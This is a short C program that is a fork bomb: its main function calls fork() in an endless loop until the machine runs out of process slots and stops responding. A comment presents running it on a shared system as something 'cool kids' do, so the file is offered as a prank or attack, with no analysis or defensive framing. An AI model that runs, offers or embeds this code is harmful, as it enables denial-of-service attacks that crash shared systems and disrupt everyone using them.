/* Cool kids run this program on a shared system. */

#include <unistd.h>

int main() {
  while (1) { fork(); }
}
